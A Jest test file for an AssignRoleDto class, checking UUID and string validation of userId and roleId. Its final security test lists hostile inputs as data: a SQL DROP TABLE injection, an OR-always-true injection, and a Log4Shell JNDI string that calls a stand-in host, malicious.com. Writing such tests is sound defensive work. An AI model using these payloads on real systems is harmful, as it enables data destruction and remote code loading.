import { validate } from 'class-validator';
import { plainToInstance } from 'class-transformer';
import { AssignRoleDto } from '../assign-role.dto';

describe('AssignRoleDto', () => {
  describe('userId validation', () => {
    it('should pass with valid UUID v4', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: 'admin-role-id',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with valid UUID v1', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '550e8400-e29b-41d4-a716-446655440000',
        roleId: 'admin-role-id',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should fail when userId is not a valid UUID', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: 'invalid-uuid',
        roleId: 'admin-role-id',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when userId is a simple string', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: 'user-123',
        roleId: 'admin-role-id',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when userId is a number', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: 12345,
        roleId: 'admin-role-id',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when userId is empty string', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '',
        roleId: 'admin-role-id',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when userId is null', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: null,
        roleId: 'admin-role-id',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });

    it('should fail when userId is undefined', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        roleId: 'admin-role-id',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });
  });

  describe('roleId validation', () => {
    it('should pass with valid string roleId', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: 'admin-role-id',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with UUID as roleId', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: '550e8400-e29b-41d4-a716-446655440000',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with numeric string as roleId', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: '12345',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with alphanumeric roleId', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: 'role_123',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should fail when roleId is a number', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: 12345,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isString');
    });

    it('should fail when roleId is empty string', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: '',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isString');
    });

    it('should fail when roleId is null', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: null,
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isString');
    });

    it('should fail when roleId is undefined', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
      });

      const errors = await validate(dto);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].constraints).toHaveProperty('isString');
    });
  });

  describe('combined validation', () => {
    it('should pass with both fields valid', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: 'admin-role-id',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should fail when both fields are invalid', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: 'invalid-uuid',
        roleId: 12345,
      });

      const errors = await validate(dto);
      expect(errors.length).toBe(2);
      
      const errorConstraints = errors.flatMap(error => Object.keys(error.constraints || {}));
      expect(errorConstraints).toContain('isUUID');
      expect(errorConstraints).toContain('isString');
    });

    it('should fail when one field is invalid', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: 'invalid-uuid',
        roleId: 'valid-role-id',
      });

      const errors = await validate(dto);
      expect(errors.length).toBe(1);
      expect(errors[0].constraints).toHaveProperty('isUUID');
    });
  });

  describe('edge cases', () => {
    it('should pass with UUID containing uppercase letters', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123E4567-E89B-12D3-A456-426614174000',
        roleId: 'ADMIN-ROLE-ID',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with roleId containing special characters', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: 'role-admin@123',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with roleId containing spaces', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: 'admin role',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with very long roleId', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: 'a'.repeat(100),
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });

    it('should pass with roleId as single character', async () => {
      const dto = plainToInstance(AssignRoleDto, {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: 'a',
      });

      const errors = await validate(dto);
      expect(errors).toHaveLength(0);
    });
  });

  describe('transformation', () => {
    it('should transform plain object to AssignRoleDto instance', () => {
      const plainData = {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: 'admin-role-id',
      };

      const dto = plainToInstance(AssignRoleDto, plainData);

      expect(dto).toBeInstanceOf(AssignRoleDto);
      expect(dto.userId).toBe('123e4567-e89b-12d3-a456-426614174000');
      expect(dto.roleId).toBe('admin-role-id');
    });

    it('should handle null input gracefully', () => {
      const dto = plainToInstance(AssignRoleDto, null);

      expect(dto).toBeInstanceOf(AssignRoleDto);
    });

    it('should handle undefined input gracefully', () => {
      const dto = plainToInstance(AssignRoleDto, undefined);

      expect(dto).toBeInstanceOf(AssignRoleDto);
    });

    it('should preserve string types for roleId', () => {
      const plainData = {
        userId: '123e4567-e89b-12d3-a456-426614174000',
        roleId: 123, // This should be transformed or remain as is based on implementation
      };

      const dto = plainToInstance(AssignRoleDto, plainData);

      expect(dto).toBeInstanceOf(AssignRoleDto);
      // The actual type depends on whether transformation is applied
      // In most cases, it would remain as number until validation
    });
  });

  describe('security considerations', () => {
    it('should validate against malicious UUID patterns', async () => {
      const maliciousUuids = [
        '00000000-0000-0000-0000-000000000000', // Nil UUID
        'ffffffff-ffff-ffff-ffff-ffffffffffff', // Max UUID
        '12345678-1234-1234-1234-123456789abc', // Valid but potentially suspicious
      ];

      for (const uuid of maliciousUuids) {
        const dto = plainToInstance(AssignRoleDto, {
          userId: uuid,
          roleId: 'test-role',
        });

        const errors = await validate(dto);
        // These should pass validation as they are valid UUID formats
        expect(errors).toHaveLength(0);
      }
    });

    it('should handle SQL injection attempts in roleId', async () => {
      const maliciousRoleIds = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "${jndi:ldap://malicious.com/a}",
      ];

      for (const roleId of maliciousRoleIds) {
        const dto = plainToInstance(AssignRoleDto, {
          userId: '123e4567-e89b-12d3-a456-426614174000',
          roleId: roleId,
        });

        const errors = await validate(dto);
        // These should pass validation as they are valid strings
        // SQL injection prevention should be handled at the database layer
        expect(errors).toHaveLength(0);
      }
    });
  });
});
